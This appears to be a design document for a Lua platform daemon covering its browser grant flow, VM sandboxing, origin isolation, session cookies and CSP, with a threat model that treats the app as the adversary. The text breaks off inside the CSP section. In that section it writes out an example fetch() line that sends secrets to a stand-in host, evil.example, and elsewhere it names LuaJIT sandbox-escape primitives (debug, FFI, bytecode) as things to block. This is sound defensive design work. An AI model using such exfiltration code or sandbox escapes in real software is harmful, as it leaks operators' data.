# Platform Daemon Design

## Problem

The platform currently launches apps as one-shot CLI processes. Each app binds its
own HTTP port. Capability grants are prompted via CLI flags (`--grant`, `--deny`)
and persisted to JSON files. This works when the operator has terminal access.

It breaks when the operator accesses the platform remotely via browser — e.g.,
over Tailscale from a phone. There is no terminal to type `--grant=llm_api`. There
is no way to launch a second app from the first. There is no way to manage multiple
ports on mobile.

## Design goals

1. **Single port.** One HTTP port serves everything — library browser, grant UI,
   all running apps. No port juggling over Tailscale.
2. **Browser-native grants.** Capability consent happens in the browser, not the
   terminal. The operator sees what an app wants, approves or denies, and the app
   starts.
3. **Capability sandbox preserved.** Each app runs in its own sandbox with its own
   caps. The daemon is the trust boundary — apps never share caps, never access
   each other's state, and never bypass the grant flow.
4. **App lifecycle management.** The daemon starts and stops apps. A crashed app
   doesn't take down other apps or the daemon.
5. **No new dependencies.** Pure Lua + FFI, consistent with the rest of crescent.

## Architecture

```
┌─────────────────────────────────────────────┐
│                 Platform Daemon              │
│                (single process)              │
│                                             │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
│  │ Router   │  │ Grant UI │  │ App Mgr  │  │
│  │ /        │  │ /grant/* │  │          │  │
│  │ /app/:id │  │          │  │ start()  │  │
│  │ /api/*   │  │          │  │ stop()   │  │
│  └──────────┘  └──────────┘  └──────────┘  │
│       │                           │         │
│       │        ┌──────────────────┤         │
│       ▼        ▼                  ▼         │
│  ┌─────────┐ ┌─────────┐   ┌─────────┐    │
│  │ Library │ │ App "a"  │   │ App "b" │    │
│  │ (built  │ │ (sandboxed│   │(sandboxed│   │
│  │  in)    │ │  handler)│   │ handler)│    │
│  └─────────┘ └─────────┘   └─────────┘    │
└─────────────────────────────────────────────┘
```

### Single process, not multi-process

Apps run as **in-process sandboxed handlers**, not as child processes on separate
ports. Each app's `create(caps)` returns a `{ handler = fn(req, res) }` — the
daemon mounts that handler under `/app/<id>/`. This is the same contract apps
already implement for the BFF pattern.

Why not child processes:
- Port management is complexity for no security gain (the sandbox is the boundary)
- Child process lifecycle is OS-specific and fragile
- Reverse-proxying adds latency and failure modes
- In-process handlers share no state — each gets its own `caps` table

The daemon IS the platform. It replaces `lib/platform/cli.lua` for the
browser-access use case. The CLI remains for terminal-only workflows.

### Router

The daemon's HTTP server dispatches by path prefix:

| Path | Handler | Description |
|------|---------|-------------|
| `/` | Library app | Built-in app browser |
| `/api/daemon/*` | Daemon API | App lifecycle, grant management |
| `/grant/:app_id` | Grant UI | Capability consent page |
| `/app/:app_id/*` | App handler | Proxied to sandboxed app handler |

The library app is not a launched app — it's built into the daemon. It queries the
index DB directly (no cap indirection needed for the launcher itself).

### Grant flow

```
User clicks "Launch" in library
        │
        ▼
POST /api/daemon/launch { app_id: "alice" }
        │
        ▼
Daemon reads manifest, checks stored grants
        │
        ├── All caps decided? ──▶ Start app, redirect to /app/alice/
        │
        └── Undecided caps? ──▶ Redirect to /grant/alice
                                      │
                                      ▼
                              Browser shows grant page:
                              "Alice wants:
                               ✅ LLM API (http_client) — api.openai.com
                               ✅ Conversation storage (db)
                               ⬜ File system (fs) — optional
                               [Allow selected] [Deny all]"
                                      │
                                      ▼
                              POST /api/daemon/grant
                              { app_id: "alice", grants: { llm_api: true, ... } }
                                      │
                                      ▼
                              Daemon persists grants, starts app,
                              redirects to /app/alice/
```

Grant decisions are persisted to the same `grants.json` files the CLI uses.
A grant made in the browser works if the app is later launched from the CLI,
and vice versa.

### Browser approve flow (concrete mechanics)

The grant flow is a redirect chain. Every step is stateless on the wire and
backed by the daemon's internal grant store and a short-lived launch-token map.

**Step 1: Launch request.**

User clicks an app in the library. Library JS sends:

```http
POST /api/daemon/launch
Content-Type: application/json
X-CSRF-Token: <session-csrf>

{ "app_id": "alice" }
```

Daemon loads the manifest, merges with stored grants in `~/.crescent/data/alice/grants.json`,
checks admin policy. Three possible outcomes:

1. **All required caps granted, no policy conflict:** daemon starts the app if
   not running, returns `{ "url": "/app/alice/" }`. Library JS redirects.
2. **Undecided caps (or manifest has new caps since last launch):** daemon
   mints a **launch token**, returns `{ "redirect": "/grant/alice?t=<token>" }`.
3. **Admin policy blocks a required cap:** daemon returns
   `{ "error": "policy_denied", "cap": "fs", "reason": "..." }`. Library shows
   an inline message; app does not start.

The launch token is a 16-byte random string stored in a server-side map:

```lua
launch_tokens[token] = {
  app_id = "alice",
  operator = session_id,       -- who initiated; checked on submit
  created_at = os.time(),
  expires_at = os.time() + 300,  -- 5 min
  undecided = { "llm_api", "conversations", "fs" },  -- snapshot at launch
}
```

Tokens are one-shot — consumed on grant submission — and expire if unused.

**Step 2: Grant UI.**

Browser GETs `/grant/alice?t=<token>`. Daemon:

1. Validates the token: exists, not expired, matches the session operator
2. Loads the app's manifest
3. Renders HTML with one form, no JavaScript needed

Response headers:
```
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; form-action 'self'
Cache-Control: no-store
```

Page content (sketch):

```
┌──────────────────────────────────────────────┐
│  Alice wants to run                          │
│  ─────────────────                           │
│  Version 0.1.0                               │
│  Tags: charactercardv2, ai, llm, roleplay    │
│                                              │
│  Alice says:                                 │
│  "A friendly AI assistant for brainstorming" │
│                                              │
│  ─────────────────────────────────           │
│                                              │
│  Required capabilities                       │
│                                              │
│  ☐ Network access to api.openai.com          │
│     Anything Alice processes can be sent     │
│     to api.openai.com. Once sent, that data  │
│     is outside your control.                 │
│     [ Alice: "used for chat responses" ]     │
│                                              │
│  ☐ Private database (conversations)          │
│     Alice stores your messages in her own    │
│     isolated database. Other apps cannot     │
│     read it.                                 │
│                                              │
│  Optional capabilities                       │
│                                              │
│  ☐ File system: ~/Documents/alice/           │
│     Alice can read and write any file        │
│     under ~/Documents/alice/.                │
│                                              │
│  ─────────────────────────────────           │
│                                              │
│  [ Deny all ]   [ Allow selected ]           │
└──────────────────────────────────────────────┘
```

Details:
- **Deny is the primary button** (left, default focus, larger), allow is secondary
- Checkboxes default **unchecked**. No pre-selection.
- Required caps — if the user denies any required cap, the submit error-outs
  with "this app cannot run without X" and offers to go back to deny all or
  approve the required ones
- App's self-declared reason shown in brackets, visually marked as
  app-controlled text so operators don't confuse it with the platform's
  authoritative disclosure
- Risk descriptions come from the cap factory, not the manifest

Form:

```html
<form method="POST" action="/grant/alice">
  <input type="hidden" name="t" value="<token>">
  <input type="hidden" name="csrf" value="<session-csrf>">

  <input type="checkbox" name="allow" value="llm_api" id="cap-llm_api">
  <input type="checkbox" name="allow" value="conversations" id="cap-conv">
  <input type="checkbox" name="allow" value="fs" id="cap-fs">

  <button type="submit" name="decision" value="deny">Deny all</button>
  <button type="submit" name="decision" value="allow">Allow selected</button>
</form>
```

**Step 3: Grant submission.**

```http
POST /grant/alice
Content-Type: application/x-www-form-urlencoded

t=<token>&csrf=<csrf>&decision=allow&allow=llm_api&allow=conversations
```

Daemon:

1. Validates CSRF token against the session
2. Validates launch token: exists, not expired, operator matches
3. **Consumes** the launch token (delete from map, even on failure — one-shot)
4. If `decision=deny`: record `false` for every undecided cap, return error page
   "Alice was not allowed to start. [Back to library]"
5. If `decision=allow`:
   - For each undecided cap, record `true` if in the `allow[]` list, else `false`
   - Persist the updated `grants.json` atomically (temp file + rename)
   - Check admin policy again (defense in depth)
   - Construct caps, call `entry_mod.create(caps)`, mount handler
   - 303 redirect to `/app/alice/`

If any required cap ends up denied, construction fails, rollback, redirect to
an error page explaining which required cap was missing.

**Step 4: First request to the app.**

Browser follows the 303 to `GET /app/alice/`. Daemon router matches the prefix,
strips it, calls `alice.handler({ method = "GET", path = "/", ... })`. The app
responds with its HTML, which references relative paths that the browser
resolves under `/app/alice/`.

### Threat model: silent grant vs fatigue

**The adversary is the app itself.** Not a rogue tab, not a compromised
extension, not a network attacker — those are lesser threats handled by
ordinary web hygiene. The app ships both a Lua backend (running inside the
daemon's LuaJIT VM) and frontend code (HTML/JS running inside the operator's
browser, generated or served by the same backend). Both halves have the same
author, collude by design, and share an attack goal: the frontend can render
social-engineering UI while the backend exfiltrates; the backend can serve a
different frontend on every request; anything the frontend "verifies" is
worthless because the backend wrote it. There is no scenario where one half is
trusted and the other is not — they are one adversary with two attack
surfaces.

Every app is treated as potentially hostile from install, because the operator
cannot audit Lua bundles or transpiled JS any more than they can audit a
Chrome extension. If the security model only holds when the app is
well-behaved, the security model does not hold. Defenses must assume the app
author is coordinating backend + frontend against the operator.

Two failure modes are equally fatal:

1. **Silent grant.** The app — either its backend Lua in-VM or its frontend JS
   via the operator's session — completes a grant flow without the operator
   seeing or approving it. The app gains caps it was never authorized for. One
   silent grant compromises everything that cap can reach.

2. **Grant fatigue.** The operator is prompted for consent so often that they
   stop reading and start click-throughing. The grant UI becomes noise. When a
   real high-risk grant appears, it gets the same reflexive click as the
   low-risk ones. Effective security collapses to zero.

Uniform friction fails at both: too low and automation slips through; too high
and humans stop paying attention. The resolution is three layers of defense —
**VM sandbox** (backend), **origin isolation** (frontend), **risk-tiered friction**
(operator) — plus fatigue reducers that don't weaken any of them.

#### VM sandbox: the backend cannot reach the daemon's memory

The app's Lua code runs in the same process as the daemon. Without strict
sandboxing it can read and mutate anything — `grants.json` in memory, other
apps' cap closures, the daemon's router tables. The VM boundary, not the HTTP
boundary, is the primary defense.

**Env-based sandbox, no `_G` access.** Each app is loaded with a per-app
environment table as its `_ENV`. The env contains exactly: the caps the app
was granted, a narrow standard-library subset (`string`, `table`, `math`,
`pairs`, `ipairs`, `tostring`, `tonumber`, `type`, `select`, `error`,
`pcall`, `xpcall`, `setmetatable`, `getmetatable`, `rawequal`, `rawget`,
`rawset`, `rawlen`), and a restricted `require` that only resolves names from
a declared whitelist in the manifest. No `_G`, no `_ENV`, no `package`.

**No `debug` library.** `debug.getupvalue`, `debug.setupvalue`,
`debug.getregistry`, `debug.getlocal`, `debug.sethook` can all escape any env
sandbox. `debug` is never in the app env under any cap.

**No `os` or `io` globals.** File I/O, time, subprocess — all mediated through
caps (`caps.fs`, `caps.time`, `caps.spawn`). The ambient `os.getenv`,
`os.date`, `io.open` are not reachable. This is already the project-wide rule
(see CLAUDE.md: Capability-based I/O); the daemon enforces it.

**No FFI.** `ffi = require("ffi")` is the canonical LuaJIT sandbox escape —
with FFI an app can call any C function in the process, including `mmap`,
`dlopen`, `system`. `ffi` is never in the restricted `require` whitelist for
an untrusted app. First-party apps that need FFI must declare it as a cap
(risk class: shared) and get explicit operator grant.

**No bytecode loading.** `load` / `loadstring` / `loadfile` either absent or
forced to text-only mode (`load(src, name, "t", env)`). Crafted LuaJIT
bytecode can bypass VM-level type checks; only source loading is safe.

**Frozen metatables on shared built-ins.** `getmetatable("")` in Lua gives
access to the string metatable — mutating `__index` there affects every string
operation in every app and in the daemon itself. Either freeze it (set
`__metatable` to a sentinel so `getmetatable` returns that instead) or don't
expose `getmetatable` on primitives. Same for number, boolean.

**Per-app `package.loaded` cache.** If two apps share a `package.loaded` table,
one can poison a module the other requires. Each app gets its own fresh module
cache at construction time. The restricted `require` closes over it.

**Cap closures, not cap tables.** Caps are functions, not mutable tables. The
app gets `caps.kv.get(key)` as a closure holding a private state upvalue. The
app cannot reach into that upvalue, cannot rebind `caps.kv.get`, cannot swap
the `caps` table for a privileged one — because `caps` itself is a function or
a frozen table with `__newindex` trapped.

**No reference to daemon internals.** The grant store, the router, the launch
token map, the cap factory — none of these modules are in the app's `require`
whitelist. An app cannot `require("lib.platform.grants")` because that name is
not in its manifest's declared deps. The restricted `require` raises an error
on any non-whitelisted name.

The VM sandbox is the primary defense. HTTP origin isolation below defends the
other half of the app (its browser frontend) — but if the VM sandbox fails,
origin isolation is irrelevant because the app already runs in the daemon.

#### Origin isolation: the frontend cannot ride the operator's session

**The grant endpoint is internal to the daemon UI, not a public API.** It is
not reachable from any app's origin. It is not a service waiting to be called
by arbitrary clients. Only one caller ever touches it: the operator's browser,
while displaying a daemon-origin page, after receiving a one-shot launch
token the operator triggered by clicking a link in the daemon UI. Every
defense below is about *preserving* that "only the operator" property — not
about hardening a public endpoint against hostile clients.

The primary guarantee is constructive, not defensive:

- **No cap produces a launch token.** `POST /api/daemon/launch` is the only
  way to mint a token, and no cap lets any app (backend or frontend) reach
  that endpoint. Apps cannot initiate the flow.
- **Tokens are one-shot, time-limited, bound to a session.** A token issued
  for operator session A cannot be consumed by operator session B or by an
  app that somehow saw the URL. The server-side map erases the token on use.
- **The grant POST is a same-origin form submission from the grant page
  itself.** The form's action is the daemon's own origin. The form is served
  by the daemon. The operator clicks submit. Nothing in that flow crosses an
  origin boundary.

If no path exists for an app to produce a valid token and submit the grant
form from the daemon origin, the grant endpoint has nothing to defend against
except the operator themselves. The web-platform hardening below is
belt-and-suspenders: it makes the "only the operator" property robust against
implementation bugs, browser quirks, and future changes that might
accidentally expose a path.

**Per-app subdomain (canonical).** Each app is served from
`app-<id>.<daemon-host>` (e.g., `app-alice.crescent.local`,
`app-alice.tsnet.ts.net`). The daemon UI lives on `<daemon-host>` directly.
Browsers treat these as separate origins *and* as separate cookie hosts — an
`HttpOnly; __Host-session=...` cookie set on the daemon host is NOT sent to
app subdomains. App frontends cannot read the session cookie, cannot fetch
daemon URLs (CORS preflight fails), cannot embed daemon pages
(frame-ancestors), cannot access daemon origin `localStorage`/`IndexedDB`.
Requires wildcard DNS — trivial on Tailscale Magic DNS, needs `dnsmasq` or
`/etc/hosts` locally.

**Per-app port is NOT a valid fallback for cookie-based auth.** Ports are part
of the Same-Origin Policy tuple (`scheme, host, port`) — so SOP, CORS,
`localStorage`, and `postMessage` all treat `localhost:7777` and
`localhost:7001` as distinct origins. But cookies are scoped by
`(host, path)` and **ignore port entirely** (RFC 6265 §8.5). `SameSite`
attributes use registrable domain, so both ports are same-site. Even `__Host-`
prefix only pins to exact hostname, not port. A session cookie set at
`localhost:7777` is sent on every request to `localhost:7001` — `HttpOnly`
hides it from frontend JS, but the app's own backend sees it in the incoming
`Cookie:` header and learns the operator's session ID. Any exfil channel
the app has (granted `http_client`, future leak paths) then leaks the session.

**Implication:** cookie-based auth requires per-subdomain origins. Per-port
isolation is sufficient for SOP-enforced protections (CORS, frame-ancestors,
storage) but not for cookie confidentiality.

**Fallback when wildcard DNS is unavailable (two options):**

1. **Distinct loopback addresses.** Bind daemon to `127.0.0.1:7777` and apps
   to `127.0.0.2:7001`, `127.0.0.3:7001`, ... — all of `127.0.0.0/8` is
   loopback on Linux/macOS. Different IPs are different hostnames for cookie
   purposes. Works without DNS. Windows requires registry configuration to
   enable loopback aliases, which is a deployment wart.
2. **No cookie auth.** Drop cookies entirely, use capability-URL session
   tokens (`/?s=<sid>` in the daemon UI path) that never traverse to app
   origins. Port-based isolation becomes sound because there is no cookie to
   leak — but see the URL-token hazards below.

Per-subdomain is canonical; the fallbacks are for environments where wildcard
DNS genuinely isn't achievable. Default deployment assumes per-subdomain.

**No CORS allowance for app origins.** The daemon never sends
`Access-Control-Allow-Origin` allowing any app origin. If an app frontend
somehow attempted a cross-origin request to the daemon (which no legitimate
code does), the browser's CORS preflight would fail.

**Frame ancestors.** Daemon pages set `Content-Security-Policy: frame-ancestors 'none'`
and `X-Frame-Options: DENY`. No iframing. An app cannot embed the grant UI
even if it somehow got the URL — preventing the clickjacking class where the
operator thinks they're clicking on the app but is actually clicking on a
hidden daemon frame.

**Sec-Fetch enforcement.** Grant POST handler checks `Sec-Fetch-Site: same-origin`
and `Sec-Fetch-Dest: document`. The only legitimate caller is a top-level
form submission from the grant page itself — which satisfies both. A fetch
or XHR from anywhere else fails these checks. This is a redundant check given
origin isolation + CSRF, but it's free to add and catches implementation
mistakes (e.g. a future accidental CORS allowance).

**No cap gives an app any handle to the grant channel.** No cap exposes
`fetch(daemon_url)`, `open_url(daemon_url)`, `trigger_launch(other_app)`,
read/write of `grants.json`, or any daemon-internal module. The backend
cannot reach the grant flow from Lua and the frontend cannot reach it from
JS. There is no legitimate in-app code path to the grant endpoint.

**No cap lets the app show a grant-looking UI.** Apps render inside their own
origin. An app drawing a fake "approve these caps" dialog is a phish, not a
grant — the real grant page lives at the daemon origin and the URL bar
reflects that. Operator education (check the URL bar) is part of this, but
the origin separation makes the phish observable rather than invisible.

**Server-initiated navigation only.** Launching an app produces a 303
redirect from the daemon to the app origin. An app rendering a link to
`<daemon-host>/grant/...` cannot pre-populate it with a valid token because
the app has no way to mint one; the link lands on the daemon showing an
"invalid or expired token" page. The app can trick the operator into
navigating, but the operator lands nowhere useful for the attacker.

#### Session token confidentiality: keep the token out of JS reach

The session identifier is a power-of-attorney. Whoever holds it can act as
the operator against the daemon. The goal is to keep it out of reach of page
JS entirely so that even a bug or XSS in the daemon UI itself cannot exfil
it to an attacker.

**Canonical: HttpOnly cookie on the daemon subdomain.**

```
Set-Cookie: __Host-session=<sid>; HttpOnly; Secure; SameSite=Strict; Path=/
```

- `HttpOnly` — `document.cookie` does not reveal the value. No JS (trusted
  or otherwise) can read the session ID.
- `Secure` — only sent over HTTPS (or localhost exception).
- `SameSite=Strict` — not sent on any cross-site navigation.
- `__Host-` prefix — must be `Path=/`, no `Domain` attribute. Pinned to exact
  hostname, rejected if set with a Domain scope.
- Per-subdomain isolation — cookie set on `daemon.<host>` is not sent to
  `app-alice.<host>` because cookies scope by exact hostname when `__Host-`
  is used (no Domain attribute → not inherited by subdomains).

The browser attaches the cookie on same-origin requests automatically. JS
never touches the value.

**What this does and does not protect against.** HttpOnly (and equivalently,
a service worker injecting `Authorization`) hides the raw token value from
page JS. It does NOT prevent authenticated requests from page JS — the
browser auto-attaches the cookie on any same-origin fetch, so an XSS on the
daemon UI can still call authenticated daemon endpoints during the XSS
window, read responses, and submit the grant form (it can read the CSRF
token from the DOM and POST it). What changes:

- **Before (plain bearer in URL or readable cookie):** XSS reads the token,
  sends it to an external attacker, attacker uses it indefinitely from
  anywhere until the session expires. Permanent account takeover.
- **After (HttpOnly cookie / SW-injected auth):** XSS cannot exfil the
  token value. It can only act during the XSS window, from the daemon
  origin, limited to what the current session authorizes. Session-bound
  same-origin CSRF.

That is a meaningful but bounded reduction. "Hidden token" is not "XSS-safe"
— it only closes the exfil channel for the raw credential. The real defense
against an XSS-completes-grant attack is preventing XSS on the daemon UI in
the first place (next section).

**Hazards of URL-based session tokens (per-port fallback only).**

If the environment can't do per-subdomain and can't do distinct loopback
addresses, and auth ends up URL-embedded (`/?s=<sid>`), the token is in
`window.location.search`. Any JS on the daemon origin can read it. There is
no way to hide a URL from the page that the URL addresses. Mitigations
reduce but do not eliminate exposure:

- `Referrer-Policy: no-referrer` on every daemon response, preventing the
  token from leaking via `Referer` when the operator clicks a link to any
  other origin (including an app).
- `rel="noopener noreferrer"` on every external link rendered by the daemon
  UI. Both (a) removes `window.opener` so the destination can't script back
  into the daemon tab, and (b) strips the referer header even if the global
  Referrer-Policy was weaker.
- `history.replaceState(null, '', '/')` immediately after load, so the URL
  bar and forward/back history don't carry the token. Does not erase the
  token from server access logs or the network tab.
- Short-lived rotating tokens (expire in minutes; refresh by re-auth) so
  leaked tokens are useless quickly.
- Server-side access logs filter the `s` query parameter out of the logged
  URL.
- No logging of `Location` redirect values at the application level.

Even with all mitigations, URL-token mode is strictly weaker than HttpOnly
cookie mode: the daemon's own trusted JS can read the token, so any XSS
escalates to full session theft. This is why URL tokens are a fallback, not
a default — and the documentation for per-port deployments must call out the
reduced XSS blast-radius guarantee.

**Alternatives considered (not pursued for v1):**

- **Service worker as a token vault.** A registered service worker can hold
  the token in its own context, which main-page JS cannot reach. SW
  intercepts outgoing fetches and injects `Authorization: Bearer <token>`.
  Real hiding from page JS. Cost: SW registration complexity, SW update
  semantics, debugging surface. Not worth v1 implementation effort.
- **WebCrypto non-extractable keys.** Daemon issues a per-session
  `CryptoKey` with `extractable: false`. Page JS can sign requests with it
  (proof of possession) but cannot read the key material. Replaces bearer
  semantics with PoP semantics. Real hiding but demands a signing scheme on
  every request. Overkill for v1 local deployments.

For v1: per-subdomain + `HttpOnly` `__Host-` cookies. Fallbacks documented
with their reduced guarantees.

#### Daemon UI XSS resistance: the real escalation path

**Why the threat reduces to XSS specifically.** There are three distinct
classes of "attacker code runs somewhere" in this architecture:

1. **Backend ACE** — app escapes the Lua VM sandbox and runs arbitrary Lua
   in the daemon process. Defended by the VM sandbox section (no `debug`,
   no FFI, no bytecode, no `_G`, restricted `require`, per-app
   `package.loaded`).
2. **Frontend ACE on the daemon origin** — the app's own JS runs on the
   daemon origin as legitimate code. No bug required; the app author just
   writes a malicious script. This is what would happen if apps and daemon
   shared an origin.
3. **Frontend XSS on the daemon origin** — a bug (bad escaping, DOM sink,
   third-party include) lets attacker-controlled data become executable
   script on the daemon origin. Requires an exploitable flaw.

Per-subdomain isolation forecloses class 2 by construction: apps live on
`app-<id>.<daemon-host>`, their scripts execute there, nothing they ship
runs on `<daemon-host>`. The remaining frontend threat is specifically
class 3 — an attacker must discover and exploit a daemon UI vulnerability.
That is a meaningful capability bar. The entire point of the per-subdomain
architecture is this downgrade; without it, the frontend is just ACE and
there is no defense.

HttpOnly cookies hide the token value but not the ability to send
authenticated requests. An XSS (class 3) on the daemon UI can read the CSRF
token from the DOM, submit the grant form with `form.submit()`, and complete
a grant — all same-origin, all authenticated, potentially invisible to the
operator. Token confidentiality narrows the post-compromise window; it does
not close it. The load-bearing defense is preventing XSS on the daemon UI
in the first place.

**Strict CSP on daemon pages.**

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self';
  form-action 'self';
  frame-ancestors 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
  trusted-types 'none';
```

- No `'unsafe-inline'` and no `'unsafe-eval'`. Inline handlers (`onclick=`)
  and inline `<style>` must not appear in daemon HTML; scripts and styles
  are external files served from the daemon origin.
- `require-trusted-types-for 'script'` with `trusted-types 'none'` rejects
  all DOM-sink assignments (`innerHTML`, `outerHTML`, `document.write`,
  `eval`, `setTimeout(string)`, ...) at the browser level. With no allowed
  policy, the daemon UI cannot use these sinks at all — enforced by the
  browser, not by review.

**Minimal daemon UI, server-rendered where possible.**

The grant page is the single most critical page on the daemon. Build it as
static server-rendered HTML with zero JS:

```html
<form method="POST" action="/grant/alice">
  <input type="hidden" name="csrf" value="...">
  <input type="hidden" name="token" value="...">
  <fieldset>
    <legend>Alice requests these capabilities:</legend>
    <label><input type="radio" name="cap[kv]" value="grant"> Grant kv</label>
    <label><input type="radio" name="cap[kv]" value="deny" checked> Deny</label>
    ...
  </fieldset>
  <button type="submit">Submit grants</button>
</form>
```

No framework, no templating DSL, no markdown renderer, no user-controlled
content. Every interpolated value (app name, cap description) HTML-escaped
in exactly one place. No JSON parsing in the client. No dynamic `innerHTML`.
The grant page's XSS surface reduces to "did the escaper have a bug."

Other daemon pages (library, settings) may need JS for interactivity. An
XSS there is still serious but doesn't directly issue grants — its reach is
bounded by what same-origin endpoints it can call.

**No third-party assets on daemon pages.** No CDNs, no Google Fonts, no
analytics, no external images. `script-src 'self'` already blocks them.

**No app-authored content rendered as HTML on daemon pages.** The library
browser displays app metadata (name, description, author) from the PNG
manifest. These fields are adversary-controlled. Render them text-only with
strict escaping — never as HTML, never as Markdown, never allowing even
inline tags. Any design desire for styled app descriptions must go through
a sanitizer treated as a known XSS risk, with explicit review.

**Client-side friction is not an XSS defense.** Hold-to-confirm UIs that
check `event.isTrusted` defend against social-engineering clicks from an
app, not against same-origin XSS. An XSS skips the client UI entirely by
calling `form.submit()` on a form it constructed. The server cannot
distinguish real from synthetic submissions at the request level.

**Server-side re-authentication for high-risk grants.** The one defense
that survives XSS is requiring a credential the XSS cannot produce:

1. **Bearer token re-entry.** For network and shared-class grants, the form
   requires the operator to type their bearer token. XSS can't type it
   without already having it (HttpOnly hides it).
2. **WebAuthn / passkey touch.** Hardware-backed assertion, origin-bound,
   user-gesture-bound. Synthesized clicks fail. Not v1, but the canonical
   long-term answer.
3. **Out-of-band confirmation.** Short code displayed on the daemon, typed
   on a second channel (CLI on the daemon host, mobile push). Breaks the
   single-browser compromise model.

For v1: client-side risk-tiered friction (fatigue management, social-attack
defense) plus bearer-token re-entry on high-risk grants (XSS defense). The
two share the grant UI surface but defend against different threats.

#### Non-browser clients (curl, scripts): credentials are the whole game

Everything above assumes a browser is running the frontend and enforcing the
browser-side half of each defense. A direct HTTP client (curl, scripts,
custom tools) ignores all of that. The defense model shifts.

**What curl ignores that browsers enforce:**

- CORS (browser decides whether to deliver the response to JS; curl just
  reads it)
- CSP (browser-side)
- SameSite cookie attributes (curl sends any cookie you pass)
- `HttpOnly` (curl has no cookie jar model; you give it the cookie string)
- Frame-ancestors, X-Frame-Options
- `Sec-Fetch-Site`, `Sec-Fetch-Dest`, `Origin`, `Referer` (curl sets these
  to whatever you tell it; they are hints about request provenance, not
  authenticated signals)

A motivated attacker wielding curl can forge any header a browser sends.
These headers catch accidental misuse and misconfigured clients; they are
not security boundaries.

**What actually defends against curl:**

1. **Network binding.** The daemon listens on loopback (`127.0.0.1`) and
   the Tailscale interface only — never `0.0.0.0` without explicit TLS +
   auth. Tailscale tailnet ACLs gate which devices can route to the daemon.
   Remote curl simply can't connect in the default deployment.
2. **Authenticate every state-changing endpoint.** No anonymous POST / PUT /
   DELETE anywhere in the daemon API. curl without a credential gets 401
   at the front door. This is the primary gate.
3. **Credential confidentiality.** A curl with the right session token is
   indistinguishable from a browser with the right session — because it
   *is* an authenticated request. Everything earlier (HttpOnly cookies,
   per-subdomain isolation, daemon UI XSS prevention, bearer re-entry for
   high-risk grants) exists to keep the token out of attacker hands. curl
   is not a separate threat class; it is the attack surface a leaked token
   exposes.
4. **Rate limiting on auth.** Even with 128-bit random bearer tokens,
   rate-limit the auth endpoint: exponential backoff on failed attempts,
   per-source lockout. Defends against online guessing and amplifies log
   signals on probing.
5. **Audit logging.** Every authenticated request logged with source IP,
   session id, path, timestamp, outcome. `/settings/audit` surfaces
   anomalies (new source IP, grants from unexpected user-agent, off-hours
   access) to the operator. Not prevention — detection.
6. **TLS on any non-loopback / non-Tailscale interface.** If the daemon is
   ever configured to bind to an interface that isn't already
   network-authenticated, TLS is mandatory. Plaintext bearer over a
   routable network is not acceptable. The daemon should refuse such binds
   by default.

**Clean threat decomposition:**

- **curl with operator credentials** = the operator (or a post-compromise
  attacker with equivalent power). No technical defense distinguishes them.
  Defense is credential protection, not request-shape analysis. The CLI is
  a legitimate user of this mode — the operator should be able to script
  their own daemon.
- **curl without credentials** = unauthenticated request = 401. Access
  control alone.
- **curl with partial credentials** (e.g. launch token but not session) =
  whatever that partial credential authorizes. The grant page view
  requires the launch token but viewing does not change state. The grant
  form submission requires the launch token AND the session AND the CSRF
  token. Each credential gates its own capability; missing one = 401 or
  403.

**CSRF tokens and curl.** CSRF tokens don't defend against curl — curl can
fetch the grant page (if it has the launch token and session), read the
CSRF token out of the HTML, and POST it back. CSRF tokens defend against a
different class (an authenticated browser session being tricked into
sending a state-changing request from a malicious cross-origin page). For
curl-class attacks the defense is credential confidentiality + rate
limiting, not CSRF. CSRF remains because the browser class still exists;
just don't think of it as stopping curl.

**Don't server-side-enforce browser-only signals.** Rejecting requests with
missing `Sec-Fetch-Site` would break legitimate CLI use. Rejecting on
header mismatch is worth doing for the browser class, but an absent
`Sec-Fetch-*` header is not evidence of malice — it's evidence of a
non-browser client. Treat presence-plus-match as a positive signal, absence
as neutral.

#### Content-Security-Policy: the frontend's network whitelist matches the backend's

Origin isolation stops the frontend from attacking the *daemon*. It does
nothing to stop the frontend from attacking the *operator* by exfiltrating
data to arbitrary third-party hosts. An app frontend without CSP can
`fetch("https://evil.example/exfil?data=" + secrets)` freely — the backend's
`http_client` host whitelist is irrelevant because the browser is making the
request, not the backend. Every data-reading cap (kv, db, fs) leaks
immediately unless the frontend is also restricted.

**How CSP actually blocks `fetch()`.** CSP is enforced by the browser's
networking layer, not by the page's JS. When a page calls
`fetch("https://evil.example/exfil")`:

1. The browser consults the CSP that arrived with the page (as HTTP header).
2. If `connect-src` does not whitelist `evil.example`, the browser refuses
   to initiate the request. No socket opens, no DNS resolves, no packet sent.
3. The `fetch()` Promise rejects with a network error; a CSP violation is
   logged to console (and reported to `report-uri` if configured to a
   daemon-controlled endpoint).

The page cannot disable, patch, or monkey-path this check — the enforcement
is in the browser binary, below the JS runtime. `fetch`, `XMLHttpRequest`,
`new Image()`, `<link>`, `<script>`, `new WebSocket()`, `new EventSource()`,
`navigator.sendBeacon` are all subject to the same gate. The trust root is
the operator's browser: if it honors CSP correctly (all current major
browsers do, strictly), the frontend has no path to a non-whitelisted host.

The app also cannot widen CSP from its own code. A `<meta http-equiv="Content-Security-Policy">`
tag the app emits can only intersect with the header, not relax it. The
daemon's header is the ceiling.

**The daemon sets CSP; the app cannot widen it.** Every HTTP response the
daemon serves on an app's behalf carries a `Content-Security-Policy` header
derived from the manifest. The app's backend handler returns body + app-level
headers; the daemon prepends/overrides the CSP before sending. The app cannot
set a looser CSP even if it tries — daemon header wins.

**Default policy (app with no network cap):**

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self' data:;
  connect-src 'self';
  form-action 'self';
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  media-src 'self';
```

`default-src 'none'` blocks everything unspecified. `'self'` means the app's
own origin. The frontend can talk to its own backend and load its own assets
— nothing else. No `fetch("https://anywhere")`, no `<img src="https://evil">`,
no `<form action="https://evil">`, no WebSocket, no beacon, no prefetch.

**With network cap granted:** the whitelisted hosts extend `connect-src`,
`img-src`, and `media-src`. If the manifest declares `http_client` with
hosts `[api.openai.com]`:

```
connect-src 'self' https://api.openai.com;
img-src    'self' data: https://api.openai.com;
